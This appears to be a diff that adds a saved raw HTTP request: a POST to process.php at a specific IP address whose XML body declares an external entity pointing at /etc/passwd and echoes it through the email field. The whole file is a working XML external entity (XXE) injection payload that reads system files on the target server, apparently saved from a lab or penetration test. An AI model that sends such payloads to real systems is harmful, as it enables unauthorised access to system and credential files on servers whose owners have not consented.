@@ -1,0 +1,20 @@
+POST http://13.56.255.132/process.php HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 209
+Connection: keep-alive
+Referer: https://13.56.255.132/
+Host: 13.56.255.132
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+	<!ENTITY email SYSTEM "/etc/passwd">
+]>
+<root>
+	<name>admin</name>
+	<tel>1234567890</tel>
+	<email>&email;</email>
+	<password>password</password>
+</root>
